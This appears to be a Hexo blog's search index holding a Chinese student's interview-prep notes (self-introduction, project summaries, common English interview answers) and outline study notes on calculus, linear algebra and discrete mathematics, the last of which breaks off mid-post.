<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>专业英语</title>
      <link href="/2021/07/25/%E4%B8%93%E4%B8%9A%E8%8B%B1%E8%AF%AD/"/>
      <url>/2021/07/25/%E4%B8%93%E4%B8%9A%E8%8B%B1%E8%AF%AD/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h1><p>Good afternoon, teachers. I’m Liu Zhenlong a rising Junior at Nanjing University of Aeronautics and Astronautics majoring in information security. Next, I’ll introduce myself from the following aspects: professional learning and competitions.</p><p>In the first five semesters, I ranked first of 101 students in the same grade. Moreover, I have received many academic honors, such as National Scholarship,  National Encouragement scholarship, Pacemaker to Merit Student, and many other scholarships.</p><p>At the same time, I took part in many competitions and won many honors. It’s worth mentioning that I won the national second prize in the CUMCM competition.</p><p>That’s all. Thank you.</p><hr><p>各位老师下午好，我是刘振龙，来自南京航空航天大学计算机科学与技术学院/人工智能学院信息安全专业的一名大三学生。下面我将从专业学习和竞赛两方面介绍自己。专业学习方面，前五个学期绩点排名专业第一，曾获国家奖学金、国家励志奖学金、校级三好学生标兵等学业荣誉。竞赛方面，在去年的数模国赛中获得二等奖，本人负责代码编写模块；软件杯国赛三等奖、天梯赛三等奖。好的，我的介绍到此结束。</p><h1 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h1><h2 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h2><p>In terms of project experience, one of my classmates and I once  developed a college physics experiment evaluation system, and Now it has been put into use in our school. Besides, in the last summer vacation，our team collaborated to develop a Big Data Project named Data Analysis Platform of Second-hand House Transaction in Beijing. And I was the leader of the seven-person team.</p><h2 id="数模国赛"><a href="#数模国赛" class="headerlink" title="数模国赛"></a>数模国赛</h2><p>CUMCM stands for Contemporary Undergraduate Mathematical Contest in Modeling. Our group chose  problem B named Crossing the desert. The tagert is to reach the end in the time frame and save as much money as possible.  Here’s the idea：<br>Step1：Build a graph<br>Step2：Use Dijkstra to find the shortest path<br>Step3：dynamic programming<br>Step4：Markov prediction<br>Step5：Add the healthy competition</p><p>去年的数模国赛，我们组选择了B题——穿越沙漠，背景取自《沙漠掘金》。游戏的目标是在规定时间内到达终点，并保留尽可能多的资金。题目有三个问题。第一个是天气情况已知，根据题目要求建图，使用dijk算法简化图，保留主要节点，使用动态规划递推。第二个仅知道当天天气情况，使用马尔可夫预测。第三个问题涉及多个游戏玩家，存在竞争关系，加入良性竞争对模型的影响。（目标函数有两个：个人利益最大化+游戏玩家间方差最小化）</p><h2 id="大数据项目"><a href="#大数据项目" class="headerlink" title="大数据项目"></a>大数据项目</h2><p>In the last summer vacation，our team developed a Big Data Project named Data Analysis Platform of Second-hand House Transaction in Beijing. And I was the leader of the seven-person team. The tagert is to show Second-hand House Transaction in beijing  . Here’s the idea:<br>Step1：data collection<br>Step2：data processing<br>Step3：data  Analysis<br>Step4：data visualization</p><p>消费者，房地产中介和政府来说，对二手房数据的分析研究来帮助用户更好的评估房产和预测未来走势</p><ol><li><p>数据收集：爬取二手房交易网站的数据</p></li><li><p>数据预处理：搭建Hadoop环境，将数据文件上传Hdfs，进行数据清洗等</p></li><li>数据分析：通过Hive进行数据分析，并利用Sqoop将结果导入Mysql</li><li>数据可视化：后端使用java、前端使用echarts模板等进行数据展示</li></ol><ul><li>Hadoop实现了一个分布式文件系统（ Distributed File System）<ul><li>HDFS为海量的数据提供了存储</li><li>而MapReduce则为海量的数据提供了计算</li></ul></li><li>hive是基于Hadoop的一个数据仓库工具，用来进行数据提取、转化、加载，将结构化的数据文件映射为一张数据库表，并提供SQL查询功能，能将SQL语句转变成MapReduce任务来执行。</li><li>Sqoop(发音：skup)是一款开源的工具，主要用于在Hadoop(Hive)与传统的数据库(mysql、postgresql…)间进行数据的传递，可以将一个关系型数据库（例如 ： MySQL ,Oracle ,Postgres等）中的数据导进到Hadoop的HDFS中，也可以将HDFS的数据导进到关系型数据库中。</li><li>spark是Hadoop MapReduce的通用并行框架，Spark，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是——Job中间输出结果可以保存在内存中，从而不再需要读写HDFS，因此Spark能更好地适用于数据挖掘与机器学习等需要迭代的MapReduce的算法。</li></ul><h2 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h2><p>基于知识图谱的网络威胁情报与态势感知系统</p><p>收集情报信息，转成固定文件格式（cve转stix2.1）、构建知识图谱、态势感知系统（攻击击检测、威胁分析）</p><p>收集数据cve，完成格式转化</p><p>模拟攻击fin6：攻击生命周期包括初步入侵，建立立足点，提升特权，内部侦察与横向运动等 </p><p>检测：</p><ul><li>Windows：借助微软的sysmon 进行日志收集 ，检测；通过恶意文件得hash等文件特征进行检测；</li><li>Linux：用 FaceBook 开源监控工具 osquery 进行日志收集  </li></ul><h1 id="专业英语"><a href="#专业英语" class="headerlink" title="专业英语"></a>专业英语</h1><h2 id="科目"><a href="#科目" class="headerlink" title="科目"></a>科目</h2><ul><li>data structure. Through this course, I learn many common data structures, such as list、stack、queue、Binery tree、graph,  and learn many common algorithms, such as patition、quick sort、dijsktra、prim、topological-sort. It can be used in other subjects, such as network、operating system and so on.</li><li>dynamic programming: divide a large problem into smaller subproblems and solve the subproblems</li><li>The divide and conquer algorithm： divide a large problem into smaller subproblems and solve the subproblems</li><li>greedy algorithm algorithm：select the optimal solution in the current state  </li><li>quick sort: Fisrt, partition, select a pivot, and divide the whole array into 2 subarrays. Second, recursion.</li><li>Banker’s Algorithm: is a well-known Algorithm for avoiding Deadlock. Determine whether the system is secure before allocating resources. If so, allocate.</li></ul><h1 id="常见话题"><a href="#常见话题" class="headerlink" title="常见话题"></a>常见话题</h1><h2 id="Introduce-your-college（介绍你的大学）"><a href="#Introduce-your-college（介绍你的大学）" class="headerlink" title="Introduce your college（介绍你的大学）"></a>Introduce your college（介绍你的大学）</h2><p>My college is Nanjing University of Aeronautics and Astronautics. It was founded in October 1952. In 1996, it entered the national “211 Project” construction. </p><p>I major in information security, and it has a great learning environment .</p><h2 id="What-is-your-greatest-strength-weakness？（你的优势-弱势是什么）"><a href="#What-is-your-greatest-strength-weakness？（你的优势-弱势是什么）" class="headerlink" title="What is your greatest strength/weakness？（你的优势/弱势是什么）"></a>What is your greatest strength/weakness？（你的优势/弱势是什么）</h2><p>My greatest strength is perseverance. For example, I didn’t get  national scholarship in my first year at university.  I am not discouraged, but work harder on my major, take part in more professional competitions and win more hornoes. So, I got it in the next year.</p><p>In terms of my greatest weakness,  I’m an introvert and sometimes I notice that I am shy to share my ideas when there’s a room of people.</p><h2 id="Talk-about-your-hometown"><a href="#Talk-about-your-hometown" class="headerlink" title="Talk about your hometown"></a>Talk about your hometown</h2><p>I come from Weifang. I live in a small town with a harmony family.  Weifang is a city in the center of Shandong province. It is a historical city with well known figures. It is famous for paper cutting、kites and so on.</p><h2 id="Talk-about-your-family"><a href="#Talk-about-your-family" class="headerlink" title="Talk about your family"></a>Talk about your family</h2><p>There are five people in my family including my grandmother, my parents, my sister and myself.  My parents are both farmers and work hard to support this family. My sister is 14 years old, a junior high school student. Our family is in harmony and I really love my family.</p><h2 id="What-are-your-hobbies？"><a href="#What-are-your-hobbies？" class="headerlink" title="What are your hobbies？"></a>What are your hobbies？</h2><p>coding and sports. </p><p>In terms of coding, I take part in many competitions and develop many projects.</p><p>Sports such as runnig, playing basketball.</p><h2 id="关于提升等"><a href="#关于提升等" class="headerlink" title="关于提升等"></a>关于提升等</h2><p>In order to achieve the target, here’s the idea:<br>First, Chunk it up. Second, deliberte practicing. Finally, Feedbook.</p><p>Look for more opportunities to deliberte practicing. </p><h2 id="不会"><a href="#不会" class="headerlink" title="不会"></a>不会</h2><p>I’m sorry，could you repeat the question？</p><p>This is so hard for me to explain, sorry.</p><hr><h1 id="最近专业新闻"><a href="#最近专业新闻" class="headerlink" title="最近专业新闻"></a>最近专业新闻</h1><ul><li>sudo堆溢出高危漏洞</li><li>wifi漏洞</li><li>滴滴下架</li><li>推特，youtube，大佬的博客，吾爱破解，看雪论坛，安全客，军火库，知识星球</li></ul><h1 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h1><ul><li>握手定理：有n个人握手，每人握手x次，握手总次数为S= nx/2。在图论中的应用：由握手定理得图中所有结点的总度数(degree)之和为<a href="https://baike.baidu.com/item/偶数/403454" target="_blank" rel="noopener">偶数</a>。</li><li>点到空间直线的距离</li><li>空间直线间的距离：重合、相交、平行、异面（求解公垂线，过一条直线做一个面平行于另一条面）</li><li>线性方程组的可解不可解：<ul><li>有解的充分必要条件为向量 <img alt="[公式]" data-src="https://www.zhihu.com/equation?tex=%5Cbeta" class="lozad"> 可以表示成向量组<img alt="[公式]" data-src="https://www.zhihu.com/equation?tex=%5Calpha_%7B1%7D%2C+%5Calpha_%7B2%7D%2C+%5Ccdots%2C+%5Calpha_%7Bn%7D" class="lozad"> 的线性组合.</li><li>它的系数矩阵秩等于增广矩阵的秩</li><li>系数矩阵秩等于n，那么方程组有唯一解，如果A的秩小于n，那么方程组有无穷多个解</li><li>n元齐次线性方程组，有非零解的充分必要条件为：它的系数矩阵的秩小于未知量的个数n</li></ul></li><li>拉格朗日定理<ul><li>微积分中的拉格朗日中值定理；</li><li>数论中的四平方和定理；</li><li>群论中的拉格朗日定理 (群论)：设H是有限群G的子群，则H的阶整除G的阶。</li></ul></li><li>泊松分布：泊松分布的参数λ是单位时间(或单位面积)内随机事件的平均发生次数。 泊松分布适合于描述单位时间内随机事件发生的次数。泊松分布的期望和方差均为λ</li><li>A <em> B=B </em> A：<ul><li>设A , B 至少有一个为零矩阵,则A , B 可交换;</li><li>设A , B 至少有一个为单位矩阵, 则A , B可交换;</li><li>设A , B 至少有一个为数量矩阵, 则A , B可交换;</li><li>设A , B 均为对角矩阵,则A , B 可交换;</li><li>设A , B 均为准对角矩阵（准对角矩阵是分块矩阵概念下的一种矩阵。即除去主对角线上分块矩阵不为零矩阵外，其余分块矩阵均为零矩阵）,且对角线上的子块均可交换，则A , B 可交换;</li></ul></li><li>极大值什么时候等于最大值，在给定区间内,有且只有一个极值点,则极值等于最值; 实质为单峰函数</li><li>m维线性空间的定义</li><li>独立性和不相关的关系：独立性是指两个变量的发生概率一点关系没有，而相关性通常是指线性关系。如果两个变量不相关，指的是线性关系里不相关，但是不能说它们么有关系，可能是线性以外的其他关系。</li><li></li></ul><h1 id="专业"><a href="#专业" class="headerlink" title="专业"></a>专业</h1><ul><li><strong>物理层到应用层的安全策略</strong></li><li>排序<ul><li>m</li></ul></li><li>二层交换与路由器的关系   我擦！我感觉这个上课没讲过！！！然后就说我印象里老师没讲了。。          Q2: 输入一个网址后，用到的协议（大概这意思）  这个有点印象，先是DNS，然后是TCP, IP, ICMP, ARP什么的；老师就接着问“那ICMP协议是干什么用的”，我我我…懵了。。。就说好像是…给某台主机发报文，然后给个回应什么的。。。</li></ul><h1 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h1><ul><li><p>selenium爬虫</p><ul><li>通过访问频率识别爬虫：代理IP来保证效率，如飞鱼ip代理</li><li>在携带 cookie 的情况下，某个 IP 请求网站过于频繁。豆瓣的反爬虫机制变为只封 cookie 不封 IP。也就说退出登录或者换个账号还能继续访问网站。</li></ul></li><li><p>做项目遇到的困难</p></li><li>MVC</li><li><p>什么是耦合<br>耦合性(Coupling)，也叫耦合度，是对模块间关联程度的度量。耦合的强弱取决于模块间接口的复杂性、调用模块的方式以及通过界面传送数据的多少。模块间的耦合度是指模块之间的依赖关系，包括控制关系、调用关系、数据传递关系。模块间联系越多，其耦合性越强，同时表明其独立性越差( 降低耦合性，可以提高其独立性)。软件设计中通常用耦合度和内聚度作为衡量模块独立程度的标准。划分模块的一个准则就是高内聚低耦合。</p></li><li><p>设计模式</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>高数笔记</title>
      <link href="/2021/07/25/%E9%AB%98%E6%95%B0%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/07/25/%E9%AB%98%E6%95%B0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="第1章-函数-极限-连续"><a href="#第1章-函数-极限-连续" class="headerlink" title="第1章 函数 极限 连续"></a>第1章 函数 极限 连续</h1><ol><li>数列的极限定义、收敛数列、发散数列</li><li>收敛数列的性质：唯一性、有界性、四则运算法则、保号性、保序性</li><li><strong>数列收敛与有界性的关系</strong>：收敛一定有界，有界不一定收敛（${(-1)^n}$）。</li><li>数列收敛的判别准则：夹逼准则、单调有界准则</li><li>函数极限、性质（唯一性、局部有界性、局部保号性、局部保序性、夹逼准则）</li><li><strong>两个重要极限</strong>：$\lim<em>{x\rightarrow0}\frac {\sin x}{x}=1 $、$\lim</em>{x\rightarrow\infty}(1+\frac 1 x)^x=e $</li><li>无穷小量、无穷大量、等价无穷小</li><li>连续与间断</li><li>闭区间上的连续函数的性质：最大值最小值定理、有界性定理、零点定理、界值定理</li><li><strong>一致连续性与连续</strong>：<ul><li>设函数 $f(x)$ 在区间I上有定义，如果 $\forall \varepsilon&gt;0, \exists \delta&gt;0$, 使得对于在区间I上的任意两点 $x<em>{1}, x</em>{2}$, 当 $\left|x<em>{1}-x</em>{2}\right|&lt;\delta$ 时 恒有 $\left|f\left(x<em>{1}\right)-f\left(x</em>{2}\right)\right|&lt;\varepsilon$, 则称函数 $f(x)$ 在区间I上一致连续。 </li><li>设函数 $f(x)$ 在区间I上有定义，如果 $\forall \varepsilon&gt;0, \exists \delta&gt;0$, 使得对于在区间I上的任意两点 $x<em>{1}, c$(定值), 当 $\left|x</em>{1}-c\right|&lt;\delta$ 时 恒有 $\left|f\left(x_{1}\right)-f\left(c\right)\right|&lt;\varepsilon$, 则称函数 $f(x)$ 在区间I上连续。 </li></ul></li></ol><h1 id="第2章-导数与微分"><a href="#第2章-导数与微分" class="headerlink" title="第2章 导数与微分"></a>第2章 导数与微分</h1><ol><li>导数、左右导数</li><li><strong>可导与连续的关系</strong>：可导必连续，连续未必可导（$f(x)=|x|$，在x=0处连续不可导）</li><li>六类基本初等函数的导数公式</li><li>微分</li><li><strong>可微与可导的关系</strong>：在一元函数中，函数$y=f(x)$在点$x_0$处可微与可导是等价的，并且$A=f’(x)$</li></ol><h1 id="第3章-微分学中值定理"><a href="#第3章-微分学中值定理" class="headerlink" title="第3章 微分学中值定理"></a>第3章 微分学中值定理</h1><ol><li>罗尔定理</li><li>拉格朗日定理</li><li>柯西定理</li><li>洛必达法则</li><li>泰勒公式</li></ol><h1 id="第4章-微分学应用"><a href="#第4章-微分学应用" class="headerlink" title="第4章 微分学应用"></a>第4章 微分学应用</h1><ol><li>函数的单调性、凹凸性、极值最值</li><li><strong>可导函数的极值点与驻点的关系</strong>：极值点一定是驻点，但是驻点不一定是极值点（$y=x^3$，x=0时）</li></ol><h1 id="第5章-不定积分"><a href="#第5章-不定积分" class="headerlink" title="第5章 不定积分"></a>第5章 不定积分</h1><ol><li>不定积分、性质</li><li>连续函数必定存在原函数</li><li>换元积分法、分部积分法</li></ol><h1 id="第6章-定积分"><a href="#第6章-定积分" class="headerlink" title="第6章 定积分"></a>第6章 定积分</h1><ol><li>定积分、存在条件、性质</li><li><strong>有界与函数可积的关系</strong>：可积一定有界，有界不一定可积（狄利克雷函数）</li><li>积分第一中值定理、积分中值定理</li><li>微积分基本公式</li></ol><h1 id="第7章-定积分的应用"><a href="#第7章-定积分的应用" class="headerlink" title="第7章 定积分的应用"></a>第7章 定积分的应用</h1><h1 id="第8章-向量代数与空间解析几何"><a href="#第8章-向量代数与空间解析几何" class="headerlink" title="第8章 向量代数与空间解析几何"></a>第8章 向量代数与空间解析几何</h1><ol><li>向量的数量积、向量的向量积、向量的混合积</li></ol><h1 id="第9章-多元函数微分学"><a href="#第9章-多元函数微分学" class="headerlink" title="第9章 多元函数微分学"></a>第9章 多元函数微分学</h1><ol><li>偏导数、全微分</li><li><strong>偏导数连续 -》可微 -》（连续 -》极限存在）、（可偏导）</strong></li></ol><h1 id="第10章-多元函数积分学"><a href="#第10章-多元函数积分学" class="headerlink" title="第10章 多元函数积分学"></a>第10章 多元函数积分学</h1><ol><li>二重积分</li></ol><h1 id="第11章-无穷级数"><a href="#第11章-无穷级数" class="headerlink" title="第11章 无穷级数"></a>第11章 无穷级数</h1><ol><li>级数、泰勒级数、傅里叶级数</li></ol><h1 id="第12章-常微分方程"><a href="#第12章-常微分方程" class="headerlink" title="第12章 常微分方程"></a>第12章 常微分方程</h1>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>线性代数笔记</title>
      <link href="/2021/07/25/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/07/25/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Ch1-行列式与线性方程组的Gauss消元法"><a href="#Ch1-行列式与线性方程组的Gauss消元法" class="headerlink" title="Ch1 行列式与线性方程组的Gauss消元法"></a>Ch1 行列式与线性方程组的Gauss消元法</h1><ol><li>行列式</li><li>n阶排列、逆序数、奇偶排列</li><li>n阶行列式定义、上三角行列式、下三角行列式</li><li>n阶行列式的性质</li><li>余子式、代数余子式、n阶行列式的展开定理</li><li>Cramer法则，（非）齐次线性方程组的解与系数行列式的关系</li><li>Gauss消元法</li></ol><h1 id="Ch2-矩阵"><a href="#Ch2-矩阵" class="headerlink" title="Ch2 矩阵"></a>Ch2 矩阵</h1><ol><li>矩阵、增广矩阵、同型矩阵、矩阵相等</li><li>行矩阵和列矩阵、零矩阵、阶梯形矩阵、方阵、（上下）三角矩阵、对角矩阵、数量矩阵、单位矩阵</li><li>矩阵的运算：加法、数乘、乘法</li><li>矩阵的转置、对称矩阵、反对称矩阵</li><li>可逆矩阵、伴随矩阵、矩阵可逆的充要条件</li><li>分块矩阵</li><li>矩阵的初等变化、初等矩阵、矩阵等价</li><li>矩阵的秩：子矩阵、k阶子式、矩阵可逆与秩的关系、行（列）满秩矩阵</li></ol><h1 id="Ch3-n维向量与线性方程组解的结构"><a href="#Ch3-n维向量与线性方程组解的结构" class="headerlink" title="Ch3 n维向量与线性方程组解的结构"></a>Ch3 n维向量与线性方程组解的结构</h1><ol><li>向量的线性组合、线性表出、组合系数</li><li>线性表出与线性方程组有解互为充要条件</li><li>向量的线性相关与线性无关</li><li>线性相关的充要条件：齐次线性方程组有非零解、矩阵的秩&lt;s、矩阵的行列式=0、向量组内线性表出</li><li>线性无关的充要条件：齐次线性方程组只有零解、矩阵的秩=s、向量组内无法线性表出</li><li>向量组的秩：向量组等价、极大线性无关组、向量组的秩</li><li>向量组的秩等于它的列（行）向量组的秩</li><li>齐次线性方程组：<ul><li>有非零解的充要条件：$r(A)&lt;n$</li><li>只有零解则：$r(A)=n$</li></ul></li><li>非齐次线性方程组：<ul><li>有解的充要条件：系数矩阵的秩与增广矩阵的秩相等</li><li>唯一解的充要条件：两者等于n</li><li>无穷解的充要条件：两者小于n</li></ul></li></ol><h1 id="Ch4-线性空间和线性变换"><a href="#Ch4-线性空间和线性变换" class="headerlink" title="Ch4 线性空间和线性变换"></a>Ch4 线性空间和线性变换</h1><ol><li>线性空间、基、维数、正交矩阵</li><li>线性变化、正交变换</li></ol><h1 id="Ch5-相似矩阵与矩阵的对角化"><a href="#Ch5-相似矩阵与矩阵的对角化" class="headerlink" title="Ch5 相似矩阵与矩阵的对角化"></a>Ch5 相似矩阵与矩阵的对角化</h1><ol><li>特征值、特征向量、特征矩阵、特征多项式</li><li>相似矩阵、性质</li><li>矩阵的对角化：n阶矩阵A可以对角化的充要条件是A有n个线性无关的特征向量。</li></ol><h1 id="Ch6-二次型"><a href="#Ch6-二次型" class="headerlink" title="Ch6 二次型"></a>Ch6 二次型</h1>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>离散数学笔记</title>
      <link href="/2021/07/25/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/07/25/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><hr><h1 id="第1章-命题逻辑的基本概念"><a href="#第1章-命题逻辑的基本概念" class="headerlink" title="第1章 命题逻辑的基本概念"></a>第1章 命题逻辑的基本概念</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li>判断给定句子是否为命题，应该分两步：首先判断它是否为陈述句，其次判断它是否有唯一的真值。</li><li>由真推出假，又由假能推出真，从而既不能为真，也不能为假的陈述句称作悖论，悖论不是命题。eg: 我正在说假话。</li><li>相容或与排斥或。</li><li>p$\rightarrow$q：p与q的蕴涵式。p$\rightarrow$q为假当且仅当p为真q为假。叙述方式：如果p，则q；只要p，就q；因为p，所以q；p仅当q；只有q才p；除非q才p；除非q，否则非p。</li><li>联结词集{$\neg$, $\bigwedge$, $\bigvee$, $\rightarrow$, $\leftrightarrow$}: 优先顺序为(), $\neg$, $\bigwedge$,  $\bigvee$, $\rightarrow$, $\leftrightarrow$; 对同一优先级，从左向右顺序进行。</li><li>给定n个命题变项，按照合式公式的形成规则，可以形成无穷个公式。其产生2<sup>n</sup>个不同的赋值，任何公式在每个赋值下只能去两个值(0，1)，真值表有$2^{2^n}$种情况，因而必有无穷多个公式具有相同的真值表。</li></ol><h2 id="题型汇总"><a href="#题型汇总" class="headerlink" title="题型汇总"></a>题型汇总</h2><ul><li><strong>命题符号化</strong></li><li><strong>求复合命题的真值与命题公式的赋值</strong></li><li><strong>判断公式的类型</strong></li><li><strong>复合命题符号化</strong></li></ul><hr><h1 id="第2章-命题逻辑等值演算"><a href="#第2章-命题逻辑等值演算" class="headerlink" title="第2章 命题逻辑等值演算"></a>第2章 命题逻辑等值演算</h1><h2 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li>$\Leftrightarrow$是元语言符号，用来说明A与B等值的一种记法，$\leftrightarrow$是联结符，也要注意与一般等号=的区别。</li><li><a href="https://wenku.baidu.com/view/61b8cb43a8956bec0975e346.html" target="_blank" rel="noopener">等值式模式</a>：双重否定律，幂等律，交换律，结合律，分配律，德摩根律，吸收律，零律，同一律，排中律，矛盾律，蕴涵等值式，等价等值式，假言易位，等价否定等值式，归谬论。</li><li>判断A$\Leftrightarrow$B是否成立的方法：<ul><li><strong>真值表法</strong>：判断A$\leftrightarrow$B是否是重言式</li><li><strong>观察法(求证$\not \Leftrightarrow$)</strong>：给出一个赋值使两个命题公式真值不同</li><li><strong>等值演算法</strong></li><li><strong>主范式</strong></li></ul></li><li>求公式A的主析取(合取范式)的方法和步骤：<ul><li><strong>等值演算法</strong><ol><li>消去联结词$\rightarrow$, $\leftrightarrow$；</li><li>否定联结词$\neg$的内移(德摩根律)或消去(双重否定律)；</li><li>使用分配律(求析取范式用$\bigwedge$对$\bigvee$的分配律，求析取范式用$\bigvee$对$\bigwedge$的分配律) -&gt; 已将A化为析取(合取范式)</li><li>将范式中不是极小项(极大项)的简单合取式(析取式)利用排中律、同一律、分配律化成若干个极小项(极大项)。</li><li>将极小项(极大项)用名称m<sub>i</sub>(M<sub>i</sub>)表示，使用幂等律，最后排序。</li></ol></li><li><strong>真值表法</strong><ol><li>写出A的真值表</li><li>找出A的成真赋值(成假赋值)</li><li>写出每个成真赋值(成假赋值)对应的极小项(极大项)，按角标从小到大析取(合取)</li></ol></li><li><strong>主析取合取互推</strong><ol><li>$\neg$m<sub>i</sub>$\Leftrightarrow$M<sub>i</sub></li><li>$\neg$M<sub>i</sub>$\Leftrightarrow$m<sub>i</sub></li></ol></li></ul></li><li>与非$\uparrow$、或非$\downarrow$：$\neg$p$\Leftrightarrow$p$\uparrow$p$\Leftrightarrow$p$\downarrow$p</li><li>{$\uparrow$},{$\downarrow$}都是联结词完备集。</li></ol><h2 id="题型汇总-1"><a href="#题型汇总-1" class="headerlink" title="题型汇总"></a>题型汇总</h2><ul><li><strong>用等值演算法证明重言式和矛盾式</strong>：A$\Leftrightarrow$1, A$\Leftrightarrow$0</li><li><strong>用等值演算法证明等值式</strong></li><li><strong>通过求公式的主析取范式(主合取范式)判断公式类型</strong></li><li><strong>通过求公式的主析取范式(主合取范式)判断两个公式是否等值</strong></li><li><strong>将已知的命题公式等值地化成给定联结词完备集上的公式</strong></li><li><strong>用等值演算等方法解决实际问题</strong></li><li>消去规则及其性质</li><li>消去序列与消去法</li></ul><hr><h1 id="第3章-命题逻辑的推理理论"><a href="#第3章-命题逻辑的推理理论" class="headerlink" title="第3章 命题逻辑的推理理论"></a>第3章 命题逻辑的推理理论</h1><h2 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li>判断推理是否正确的方法：<ul><li>真值表法</li><li>等值演算法</li><li>主析取范式法</li><li><strong><font color="#dd0000">推理定律</font></strong></li></ul></li><li><a href="https://wenku.baidu.com/view/61b8cb43a8956bec0975e346.html" target="_blank" rel="noopener">推理定律</a>：附加律、化简律、假言推理、拒取式、析取三段论、假言三段论、等价三段论、<em>构造性二难、构造性二难（特殊形式）、破坏性二难</em></li><li><strong>推理规则</strong>：前提引入规则、结论引入规则、置换规则、假言推理规则、附加规则、化简规则、拒取式规则、析取三段论规则、假言三段论规则、等价三段论规则、<em>构造性二难规则、破坏性二难规则</em>、合取引入规则</li><li>构造证明的方法：<ul><li>直接证明法</li><li>附加前提证明法</li><li>归谬证明法</li></ul></li></ol><h2 id="题型汇总-2"><a href="#题型汇总-2" class="headerlink" title="题型汇总"></a>题型汇总</h2><ul><li><strong>用等值演算法判断推理是否正确</strong></li><li><strong>用主析取范式法判断推理是否正确</strong></li><li><strong>在自然推理系统P中用直接证明法证明推理</strong></li><li><strong>在自然推理系统P中用附加前提证明法证明推理</strong></li><li><strong>在自然推理系统P中用归谬法证明推理</strong></li><li><strong>寻找给定前提的有效结论</strong></li><li>用消解证明法构造推理证明</li><li>在自然推理系统P中，构造用自然语言描述的推理</li></ul><hr><h1 id="第4章-一阶逻辑基本概念"><a href="#第4章-一阶逻辑基本概念" class="headerlink" title="第4章 一阶逻辑基本概念"></a>第4章 一阶逻辑基本概念</h1><h2 id="基础知识-3"><a href="#基础知识-3" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li><p>一阶逻辑命题符号化</p><ul><li><strong>个体词</strong>：个体、个体常项、个体变项、个体域(论域)、有限个体域、无限个体域、全总个体域</li><li><strong>谓词</strong>：谓词常项、谓词变项、n元谓词、0元谓词</li><li><strong>量词</strong>：量词、全称量词($\forall$)、存在量词($\exists$)</li><li><strong>命题符号化</strong>：<ul><li>基本公式1：“对D中所有x而言，如果x有性质F，x就有性质G” $\forall$x(F(x)$\rightarrow$G(x))</li><li>基本公式2：“D中存在x既有性质F、又有性质G”  $\exists$x(F(x)$\bigwedge$G(x))</li><li>基本公式应用：“对D中所有x,y而言，若x有性质F，y有性质G，则x与y就有关系H”  $\forall$x$\forall$y(F(x)$\bigwedge$G(y)$\rightarrow$H(x,y))</li><li>基本公式应用：“对D中所有x而言，若x有性质F，就存在y有性质G，使得x与y就有关系H”$\forall$x(F(x)$\rightarrow$(G(y)$\bigwedge$H(x,y)))</li><li>基本公式应用：“D中存在x有性质F，并且对D中所有y而言，如果y有性质G,则x与y就有性质H”  $\exists$x(F(x)$\bigwedge$ $\forall$y(G(y)$\rightarrow$H(x,y)))</li></ul></li></ul></li><li><p>一阶逻辑公式及解释</p><ul><li><strong>一阶语言</strong>：由非逻辑符集合L生成的一阶语言的字母表(非逻辑符号、逻辑符号)，项，原子公式、合式公式(也称谓词公式，简称公式)</li><li><strong>量词的辖域</strong>：量词的辖域、指导变元、个体变项的自由出现与约束出现、闭式</li><li><strong>一阶语言的解释</strong>：解释、赋值、公式在解释I和I下的赋σ值下的解释</li><li><strong>公式的类型</strong>：永真式(逻辑有效式)、矛盾式(永假式)、可满足式、代换实例</li></ul></li></ol><h2 id="题型汇总-3"><a href="#题型汇总-3" class="headerlink" title="题型汇总"></a>题型汇总</h2><ul><li><strong>一阶逻辑命题符号化</strong></li><li><strong>在一阶逻辑中将简单的数学命题符号化</strong></li><li><strong>给定解释和赋值，解释给定公式</strong></li><li><strong>证明公式既不是永真式，也不是矛盾式</strong></li><li><strong>证明永真式、矛盾式</strong></li></ul><hr><h1 id="第5章-一阶逻辑等值演算与推理"><a href="#第5章-一阶逻辑等值演算与推理" class="headerlink" title="第5章 